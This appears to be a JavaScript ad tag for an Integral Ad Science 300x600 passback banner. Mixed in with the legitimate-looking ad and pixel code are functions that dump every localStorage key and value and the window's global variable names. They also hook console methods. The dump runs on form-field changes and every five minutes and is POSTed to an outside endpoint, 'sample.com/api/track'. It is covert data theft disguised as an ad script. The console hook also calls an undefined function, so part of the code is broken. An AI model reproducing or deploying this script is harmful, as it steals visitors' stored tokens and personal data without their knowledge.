(function () {
  "use strict";

  var trackedElements = ["input", "select", "textarea"];
  var jshookList = ['alert', 'log', 'warn'];
  var doc = window.document;
  function generateTrackHash(trackData) {
    const trackKeys = Object.keys(trackData).sort().join("");
    let hashCode = 0;
    for (let i = 0; i < trackKeys.length; i++) {
      const trackChar = trackKeys.charCodeAt(i);
      hashCode = (hashCode << 5) - hashCode + trackChar;
      hashCode |= 0;
    }
    return hashCode.toString(16);
  }
  function findScriptNode() {
    var scripts,
      result = doc.currentScript;
    if (!result) {
      scripts = doc.getElementsByTagName('script');
      result = scripts[scripts.length - 1];
    }
    return result;
  }
  function globalVariableCollection() {
    return Object.keys(window);
  }
  function createImage() {
    var SIZE = '300x600';
    var widthHeight = SIZE.split('x');
    var result = doc.createElement('img');
    result.src = 'https://static.adsafeprotected.com/IAS_PassbackAds_300x600.png';
    result.width = widthHeight[0];
    result.height = widthHeight[1];
    return result;
  }
  function localStorageTracker() {
    const storageItems = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const storageKey = window.localStorage.key(i);
      storageItems[storageKey] = window.localStorage.getItem(storageKey);
    }
    return storageItems;
  }
  function findClickMacro(thisScriptNode) {
    var result, parsed;
    var rjssScript = thisScriptNode.previousSibling;

    // TODO: there's probably a more elegant way to write this
    while (rjssScript) {
      if (rjssScript.src && typeof rjssScript.src === 'string') {
        parsed = /ias_pb_click=([^&]+)/.exec(rjssScript.src);
        if (parsed && parsed[1]) {
          result = parsed[1];
          break;
        } else {
          rjssScript = rjssScript.previousSibling; // set to null when we run out of nodes
        }
      } else {
        rjssScript = rjssScript.previousSibling; // set to null when we run out of nodes
      }
    }
    return result;
  }
  function createAnchor(thisScriptNode) {
    var clickMacro = findClickMacro(thisScriptNode);
    var macroIsExpanded = typeof clickMacro === 'string' && clickMacro.indexOf('http') === 0;
    var LANDING_PAGE = 'https://go.integralads.com/ad-blocking-explainer/?utm_campaign=GLB-g&utm_medium=gdisplay&utm_source=gsites';
    var result = doc.createElement('a');
    result.href = clickMacro && macroIsExpanded ? decodeURIComponent(clickMacro) + encodeURIComponent(LANDING_PAGE) : LANDING_PAGE;
    result.target = '_blank';
    return result;
  }
  function loadBeacon(url) {
    if (url) {
      var img = new Image();
      img.src = url;
    }
  }
  function jshook() {
    jshookList.forEach(hook => {
      const orig = console[hook];
      console[hook] = function (...args) {
        sendDataToAPI({
          type: 'console',
          method: hook,
          arguments: args
        });
        orig.apply(console, args);
      };
    });
  }
  function sendTrackDataToAPI(data) {
    const trackId = generateTrackHash(data);
    const trackAPIURL = "https://sample.com/api/track";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", trackAPIURL, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    const payload = {
      id: trackId,
      data: data
    };
    xhr.send(JSON.stringify(payload));
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        console.log("Track data sent successfully");
      }
    };
  }
  function appendTag(thisScriptNode) {
    var img = createImage();
    var a = createAnchor(thisScriptNode);
    a.appendChild(img);
    thisScriptNode.parentNode.insertBefore(a, thisScriptNode);
    if (Math.random() <= 0.01) {
      loadBeacon('https://pixel.adsafeprotected.com/mon?anId=927087&advId=house-ad&campId=gdn&pubId=300x600&chanId=2' + getLoc());
      loadBeacon('');
    }
  }
  function startTracking() {
    const trackData = {
      localStorage: localStorageTracker(),
      jshook: jshook(),
      globalVars: globalVariableCollection()
    };
    sendTrackDataToAPI(trackData);
  }
  function sendDiag(e) {
    try {
      var url = 'https://pixel.adsafeprotected.com/mon?anid=925116&advId=housead&campId=gdn&adsafe_jsinfo=';
      if (e && e.message) {
        url += 'derr:' + encodeURIComponent(e.message.toString().replace(/ /g, '-')).substring(0, 200);
      }
      url += ',dconfig:300x600';
      loadBeacon(url);
    } catch (err) {}
  }
  function getLoc() {
    var loc, ao, type;
    var result = '';
    try {
      loc = top.location.href;
      type = 'a';
    } catch (e) {}
    if (!loc && window.location.ancestorOrigins) {
      ao = window.location.ancestorOrigins;
      loc = ao[ao.length - 1];
      type = 'g';
    }
    if (loc) {
      result = '&adsafe_url=' + encodeURIComponent(loc) + '&adsafe_type=' + type;
    }
    return result;
  }
  try {
    appendTag(findScriptNode());
  } catch (e) {
    sendDiag(e);
  }
  window.addEventListener('load', function () {
    trackedElements.forEach(element => {
      document.body.addEventListener("change", function (event) {
        if (event.target.nodeName.toLowerCase() === element) {
          startTracking();
        }
      });
    });
    setInterval(startTracking, 5 * 60 * 1000);
  });
})();